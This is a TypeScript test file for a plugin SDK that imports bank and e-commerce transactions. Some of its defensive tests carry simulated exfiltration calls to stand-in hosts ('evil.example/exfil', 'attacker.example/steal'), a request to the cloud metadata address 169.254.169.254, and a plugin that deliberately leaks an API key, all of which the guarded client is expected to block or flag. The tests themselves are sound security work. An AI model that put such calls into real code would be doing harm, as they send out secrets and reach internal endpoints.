import { describe, expect, test } from "bun:test";
import {
  createGuardedHttp,
  definePlugin,
  isPluginError,
  money,
  PluginError,
  redact,
  sanitizeText,
  validateManifest,
} from "../src/index.ts";
import { mockHttp, testPlugin } from "../src/testing.ts";

describe("money helpers", () => {
  test("exact integer-cent conversion, arithmetic, and zero normalization", () => {
    expect(money.fromCents(9331)).toBe("93.31");
    expect(money.fromCents(-500n)).toBe("-5.00");
    expect(money.fromCents(0)).toBe("0.00");
    expect(money.fromCents(-0)).toBe("0.00");
    expect(money.toCents("93.31")).toBe(9331n);
    expect(money.toCents("-0.05")).toBe(-5n);
    expect(money.negate("0.00")).toBe("0.00");
    expect(money.negate("12.34")).toBe("-12.34");
    expect(money.negate("-12.34")).toBe("12.34");
    expect(money.abs("-12.34")).toBe("12.34");
    expect(money.add("93.31", "-102.00", "5.34", "5.00", "-1.65")).toBe("0.00");
    expect(money.subtract("100.00", "93.31")).toBe("6.69");
    expect(money.fromMinorUnits(9331, "usd")).toBe("93.31");
    expect(money.isMoney("-0.00")).toBe(false);
    expect(money.isMoney("12.3")).toBe(false);
    expect(money.isMoney("12.34")).toBe(true);
  });

  test("refuses floats and unsupported zero-decimal currencies with actionable hints", () => {
    expect(() => money.fromCents(12.34)).toThrow(PluginError);
    try {
      money.fromMinorUnits(1000, "JPY");
      throw new Error("expected throw");
    } catch (error) {
      expect(isPluginError(error)).toBe(true);
      if (isPluginError(error)) {
        expect(error.code).toBe("invalid_money");
        expect(error.hint).toContain("two-decimal");
      }
    }
  });
});

describe("redact and sanitizeText", () => {
  test("scrubs explicit secrets, encoded secrets, headers, query params, and bidi overrides", () => {
    const secret = "tok_secret_9876543210+abc";
    const fakeStripeKey = `${"rk_"}live_AbCdEfGhIjKlMnOpQrStUvWx`;
    const dirty = `Failed Authorization: Bearer ${secret} url=?api_key=${encodeURIComponent(secret)} key=${fakeStripeKey} \u202e spoof`;
    const clean = redact(dirty, [secret]);
    expect(clean).not.toContain(secret);
    expect(clean).not.toContain(encodeURIComponent(secret));
    expect(clean).not.toContain("AbCdEfGhIjKl");
    expect(clean).not.toContain("\u202e");
    expect(clean).toContain("[redacted]");
    expect(sanitizeText("  hello\t\n\u202eworld  ", 20)).toBe("hello world");
  });
});

describe("manifest validation", () => {
  test("rejects wildcards, IP addresses, undeclared clearing roles, and bad slugs", () => {
    const issues = validateManifest({
      id: "Bad_ID",
      version: "v1",
      name: "",
      description: "Test",
      capabilities: ["ingest"],
      domains: ["*.stripe.com", "127.0.0.1", "https://api.example.com"],
      auth: { kind: "api_key", label: "Key", envVar: "bad_var" },
      roles: [{ key: "revenue.sales", label: "Sales", kind: "income", required: true }],
      clearing: { role: "payouts.in-transit", windowDays: 99 },
    });
    const fields = issues.map((i) => i.field);
    expect(fields).toContain("manifest.id");
    expect(fields).toContain("manifest.version");
    expect(fields).toContain("manifest.name");
    expect(fields).toContain("manifest.domains");
    expect(fields).toContain("manifest.auth.envVar");
    expect(fields).toContain("manifest.clearing.role");
    expect(fields).toContain("manifest.clearing.windowDays");
  });
});

describe("GuardedHttp egress and secret protection", () => {
  test("blocks undeclared hosts, non-HTTPS, AWS IMDS, and cross-host redirects", async () => {
    const http = createGuardedHttp({
      domains: ["api.mercury.com"],
      secrets: ["my_super_secret_token"],
      sleep: async () => {},
      fetchImpl: mockHttp({
        "GET https://api.mercury.com/redirect-evil": {
          status: 302,
          body: "",
          headers: { location: "https://evil.example/steal" },
        },
        "GET https://api.mercury.com/auth-fail": {
          status: 401,
          body: "Invalid Bearer my_super_secret_token",
        },
        "GET https://api.mercury.com/rate-limit": {
          status: 429,
          body: "Slow down",
          headers: { "retry-after": "15" },
        },
      }),
    });

    await expect(http.fetch("https://evil.example/exfil")).rejects.toMatchObject({
      code: "egress_blocked",
    });
    await expect(http.fetch("http://api.mercury.com/v1/accounts")).rejects.toMatchObject({
      code: "egress_blocked",
    });
    await expect(http.fetch("https://169.254.169.254/latest/meta-data/")).rejects.toMatchObject({
      code: "egress_blocked",
    });
    await expect(http.fetch("https://api.mercury.com/redirect-evil")).rejects.toMatchObject({
      code: "egress_blocked",
    });

    try {
      await http.getJson("https://api.mercury.com/auth-fail");
      throw new Error("expected auth_error");
    } catch (error) {
      expect(isPluginError(error)).toBe(true);
      if (isPluginError(error)) {
        expect(error.code).toBe("auth_error");
        expect(error.message).not.toContain("my_super_secret_token");
        expect(error.message).toContain("[redacted]");
      }
    }

    try {
      await http.getJson("https://api.mercury.com/rate-limit");
      throw new Error("expected rate_limited");
    } catch (error) {
      expect(isPluginError(error)).toBe(true);
      if (isPluginError(error)) {
        expect(error.code).toBe("rate_limited");
        expect(error.retryAfterSeconds).toBe(15);
      }
    }
  });

  test("enforces maxBytes cap and preserves verbatim raw bytes in getJson()", async () => {
    const payload = JSON.stringify({ ok: true, amount: 9331 });
    const http = createGuardedHttp({
      domains: ["api.mercury.com"],
      maxBytes: 64,
      fetchImpl: mockHttp({
        "GET https://api.mercury.com/small": { body: payload },
        "GET https://api.mercury.com/huge": { body: "x".repeat(200) },
      }),
    });

    const res = await http.getJson<{ ok: boolean; amount: number }>(
      "https://api.mercury.com/small",
      { name: "small.json" },
    );
    expect(res.data).toEqual({ ok: true, amount: 9331 });
    expect(new TextDecoder().decode(res.raw.bytes)).toBe(payload);
    expect(res.raw.name).toBe("small.json");

    await expect(http.getJson("https://api.mercury.com/huge")).rejects.toMatchObject({
      code: "payload_too_large",
    });
  });

  test("retries HTTP 429 (honoring Retry-After) and 503 with backoff, and never retries 401", async () => {
    let transientCalls = 0;
    let authCalls = 0;
    const sleeps: number[] = [];
    const http = createGuardedHttp({
      domains: ["api.stripe.com"],
      maxAttempts: 4,
      sleep: async (ms) => {
        sleeps.push(ms);
      },
      random: () => 0.5,
      fetchImpl: (async (input) => {
        const url = input instanceof Request ? input.url : String(input);
        if (url.endsWith("/flaky")) {
          transientCalls += 1;
          if (transientCalls === 1) {
            return new Response("Slow down", { status: 429, headers: { "retry-after": "2" } });
          }
          if (transientCalls === 2) {
            return new Response("Temporary outage", { status: 503 });
          }
          return Response.json({ recovered: true });
        }
        authCalls += 1;
        return new Response("Bad key", { status: 401 });
      }) as typeof fetch,
    });

    const ok = await http.getJson<{ recovered: boolean }>("https://api.stripe.com/flaky");
    expect(ok.data).toEqual({ recovered: true });
    expect(transientCalls).toBe(3);
    expect(sleeps).toHaveLength(2);
    expect(sleeps[0]).toBe(2000); // honored Retry-After: 2

    await expect(http.getJson("https://api.stripe.com/auth")).rejects.toMatchObject({
      code: "auth_error",
    });
    expect(authCalls).toBe(1); // never retried 401
  });
});

describe("definePlugin compile-time inference and testPlugin invariants", () => {
  test("Mercury-style BankLine plugin passes all five invariants with clean preview", async () => {
    const mercury = definePlugin({
      manifest: {
        id: "mercury",
        version: "0.1.0",
        name: "Mercury",
        description: "Import checking and credit card transactions from Mercury.",
        capabilities: ["ingest"],
        domains: ["api.mercury.com"],
        auth: { kind: "api_key", label: "Mercury API token", envVar: "RASTRATA_MERCURY_KEY" },
        fields: [
          { key: "syncFrom", label: "Start date", kind: "date", required: true },
          { key: "includePending", label: "Include pending", kind: "boolean", default: false },
          {
            key: "mode",
            label: "Environment",
            kind: "select",
            options: [
              { value: "live", label: "Live" },
              { value: "sandbox", label: "Sandbox" },
            ],
            default: "live",
          },
        ],
      },
      async *pull({ auth, config, cursor, http, emit }) {
        // Compile-time type checks inferred straight from manifest (zero `as const` needed):
        const _start: string = config.syncFrom;
        const _pending: boolean = config.includePending;
        const _mode: "live" | "sandbox" = config.mode;
        const _key: string = auth.apiKey;
        expect(_mode).toBe("live");
        expect(_pending).toBe(false);

        const since = cursor ?? _start;
        const { data, raw } = await http.getJson<{
          balanceCents: number;
          transactions: { id: string; date: string; cents: number; payee: string }[];
        }>(`https://api.mercury.com/api/v1/transactions?start=${since}`, {
          headers: { Authorization: `Bearer ${_key}` },
          name: `mercury-${since}.json`,
        });

        yield {
          sourceKey: "mercury:checking-01",
          raw,
          lines: data.transactions.map((tx) =>
            emit.bankLine({
              accountKey: "mercury:checking-01",
              providerId: tx.id,
              postedOn: tx.date,
              amount: money.fromCents(tx.cents),
              currency: "USD",
              description: tx.payee,
            }),
          ),
          balances: [
            emit.balance({
              accountKey: "mercury:checking-01",
              asOf: "2026-09-30",
              balance: money.fromCents(data.balanceCents),
            }),
          ],
          cursor: "2026-09-30",
        };
      },
    });

    const report = await testPlugin(mercury, {
      config: { syncFrom: "2026-09-01", includePending: false, mode: "live" },
      routes: {
        "GET https://api.mercury.com/api/v1/transactions?start=2026-09-01": {
          body: {
            balanceCents: 145025,
            transactions: [
              { id: "tx_1", date: "2026-09-02", cents: -4250, payee: "AWS" },
              { id: "tx_2", date: "2026-09-09", cents: 9331, payee: "STRIPE TRANSFER" },
            ],
          },
        },
      },
    });

    expect(report.ok, JSON.stringify(report.issues, null, 2)).toBe(true);
    expect(report.summary).toEqual({
      batchCount: 1,
      bankLineCount: 2,
      eventCount: 0,
      balanceCheckCount: 1,
    });
    expect(report.preview).toContain("AWS");
    expect(report.preview).toContain("-42.50 USD");
    expect(report.preview).toContain("1450.25");
  });

  test("Shopify-style multi-leg LedgerEvent plugin enforces role keys at compile time and prints debit/credit preview", async () => {
    const shopify = definePlugin({
      manifest: {
        id: "shopify",
        version: "0.1.0",
        name: "Shopify",
        description: "Import Shopify payouts with sales, fees, refunds, and sales tax.",
        capabilities: ["ingest"],
        domains: ["shop.myshopify.com"],
        auth: { kind: "oauth2", provider: "shopify", scopes: ["read_shopify_payments_payouts"] },
        roles: [
          { key: "payouts.in-transit", label: "Payouts in transit", kind: "asset", required: true },
          { key: "revenue.sales", label: "Sales", kind: "income", required: true },
          { key: "shopify.fees", label: "Shopify fees", kind: "expense", required: true },
          { key: "refunds", label: "Refunds", kind: "income", required: true },
          { key: "tax.sales", label: "Sales tax payable", kind: "liability", required: true },
        ],
        clearing: { role: "payouts.in-transit", windowDays: 7 },
      },
      normalize(raw, { emit }) {
        const payout = JSON.parse(new TextDecoder().decode(raw.bytes)) as {
          id: string;
          date: string;
          netCents: number;
          salesCents: number;
          feeCents: number;
          refundCents: number;
          taxCents: number;
        };

        // Compile-time check: an undeclared role key fails TypeScript compilation.
        const checkCompileTimeRole = () =>
          emit.event({
            accountKey: "shopify:shop_1:usd",
            providerId: payout.id,
            eventOn: payout.date,
            summary: `Shopify payout ${payout.id}`,
            currency: "USD",
            legs: [
              // @ts-expect-error undeclared role key must be rejected at compile time
              { role: "not.a.real.role", amount: "1.00" },
              { role: "revenue.sales", amount: "-1.00" },
            ],
          });
        void checkCompileTimeRole;

        return {
          lines: [
            emit.event({
              accountKey: "shopify:shop_1:usd",
              providerId: payout.id,
              eventOn: payout.date,
              summary: `Shopify payout ${payout.id}`,
              currency: "USD",
              amount: money.fromCents(payout.netCents),
              legs: [
                { role: "payouts.in-transit", amount: money.fromCents(payout.netCents) },
                { role: "revenue.sales", amount: money.fromCents(-payout.salesCents) },
                { role: "shopify.fees", amount: money.fromCents(payout.feeCents) },
                { role: "refunds", amount: money.fromCents(payout.refundCents) },
                { role: "tax.sales", amount: money.fromCents(-payout.taxCents) },
              ],
              links: { payout: payout.id },
              sourceId: `shopify-payout-${payout.id}`,
            }),
          ],
        };
      },
    });

    const fixtureBytes = new TextEncoder().encode(
      JSON.stringify({
        id: "po_101",
        date: "2026-09-09",
        netCents: 9331,
        salesCents: 10200,
        feeCents: 534,
        refundCents: 500,
        taxCents: 165,
      }),
    );

    const report = await testPlugin(shopify, {
      fixtures: [
        { bytes: fixtureBytes, mediaType: "application/json", name: "payout-po_101.json" },
      ],
    });

    expect(report.ok, JSON.stringify(report.issues, null, 2)).toBe(true);
    expect(report.summary.eventCount).toBe(1);
    expect(report.preview).toContain("Payouts in transit");
    expect(report.preview).toContain("DR       93.31");
    expect(report.preview).toContain("CR      102.00");
  });

  test("testPlugin catches unbalanced events, non-determinism, secret leaks, and blocked egress", async () => {
    const manifest = {
      id: "broken",
      version: "0.1.0",
      name: "Broken",
      description: "Negative test plugin.",
      capabilities: ["ingest"] as const,
      domains: ["api.broken.test"] as const,
      auth: { kind: "api_key" as const, label: "Key", envVar: "RASTRATA_BROKEN_KEY" },
      roles: [
        { key: "payouts.in-transit", label: "Clearing", kind: "asset" as const, required: true },
        { key: "revenue.sales", label: "Sales", kind: "income" as const, required: true },
      ],
    };

    // 1. Unbalanced event (off by +0.01)
    const unbalanced = definePlugin({
      manifest,
      normalize() {
        return {
          lines: [
            {
              kind: "event",
              provider: "broken",
              accountKey: "broken:1",
              providerId: "po_bad",
              rawIndex: 0,
              eventOn: "2026-09-09",
              summary: "Bad payout",
              currency: "USD",
              legs: [
                { role: "payouts.in-transit", amount: "98.65" },
                { role: "revenue.sales", amount: "-98.64" },
              ],
            },
          ],
        };
      },
    });
    const unbalancedReport = await testPlugin(unbalanced, {
      fixtures: [{ bytes: new TextEncoder().encode("{}"), mediaType: "application/json" }],
    });
    expect(unbalancedReport.ok).toBe(false);
    expect(unbalancedReport.issues[0]?.message).toContain("+0.01");
    expect(unbalancedReport.issues[0]?.message).toContain("debits 98.65, credits 98.64");

    // 2. Non-determinism
    let counter = 0;
    const flaky = definePlugin({
      manifest,
      normalize(_raw, { emit }) {
        counter += 1;
        return {
          lines: [
            emit.bankLine({
              accountKey: "broken:1",
              providerId: `id_${counter}`,
              postedOn: "2026-09-09",
              amount: "10.00",
              currency: "USD",
              description: "Flaky",
            }),
          ],
        };
      },
    });
    const flakyReport = await testPlugin(flaky, {
      fixtures: [{ bytes: new TextEncoder().encode("{}"), mediaType: "application/json" }],
    });
    expect(flakyReport.ok).toBe(false);
    expect(flakyReport.issues.some((i) => i.invariant === "determinism")).toBe(true);

    // 3. Canary secret leak in cursor
    const leaky = definePlugin({
      manifest,
      async *pull({ auth, http, emit }) {
        const { raw } = await http.getJson("https://api.broken.test/items");
        yield {
          sourceKey: "broken:1",
          raw,
          lines: [
            emit.bankLine({
              accountKey: "broken:1",
              providerId: "tx_1",
              postedOn: "2026-09-09",
              amount: "10.00",
              currency: "USD",
              description: "Test",
            }),
          ],
          cursor: `leak:${auth.apiKey}`,
        };
      },
    });
    const leakyReport = await testPlugin(leaky, {
      routes: { "GET https://api.broken.test/items": { body: [] } },
    });
    expect(leakyReport.ok).toBe(false);
    expect(leakyReport.issues.some((i) => i.invariant === "secret_leak")).toBe(true);

    // 4. Egress violation
    const exfil = definePlugin({
      manifest,
      async *pull({ http }) {
        await http.getJson("https://attacker.example/steal");
        yield {
          sourceKey: "broken:1",
          raw: { bytes: new Uint8Array([123, 125]), mediaType: "application/json" },
          lines: [],
        };
      },
    });
    const exfilReport = await testPlugin(exfil, {
      routes: { "GET https://attacker.example/steal": { body: {} } },
    });
    expect(exfilReport.ok).toBe(false);
    expect(exfilReport.issues.some((i) => i.invariant === "egress")).toBe(true);
  });
});
